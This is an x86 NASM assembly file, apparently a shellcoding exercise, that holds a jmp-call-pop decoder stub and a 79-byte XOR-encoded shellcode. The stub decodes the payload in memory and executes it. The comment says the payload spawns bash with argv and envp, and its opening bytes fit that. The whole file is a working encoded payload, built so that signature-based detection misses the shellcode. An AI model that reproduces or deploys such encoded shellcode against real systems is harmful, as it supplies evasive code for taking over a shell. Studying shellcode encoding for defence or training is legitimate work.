; decode_bash_argv_envp.nasm
; Author: Chase Hatch
; Decodes and executes the XOR-encoded version of the bash_argv_envp shellcode

section .text
global _start
_start:

	jmp short call_bashcode

decode_op:
	pop esi		;addy of bashcode
	xor ecx, ecx
	mov cl, 0x4f	;79 len
	
decode_iter:
	xor byte [esi], 0x59	;encoder byte \x59
	inc esi
	loop decode_iter
	jmp short bashcode
	 

call_bashcode:
	call decode_op
	bashcode:	db 	0x68,0x99,0x09,0x31,0x3b,0x38,0x2a,0x31,0x31,0x3b,0x30,0x37,0x76,0x31,0x76,0x76,0x76,0x76,0xd0,0xba,0x09,0x31,0x3a,0xc9,0xc9,0xc9,0x31,0x74,0x37,0x36,0x2b,0xd0,0x1d,0x7d,0x5c,0x09,0x31,0x31,0x04,0x63,0x03,0x31,0x02,0x3b,0x38,0x2a,0x31,0x09,0x0a,0x68,0x64,0x9f,0x1d,0x7d,0x52,0x79,0x09,0xd4,0x6d,0x7d,0xd4,0x17,0x4d,0x08,0x0a,0xd0,0xb8,0x09,0xd4,0x0f,0x5d,0x0b,0xd4,0x4d,0x7d,0xe9,0x52,0x94,0xd9
	; 79 bytes
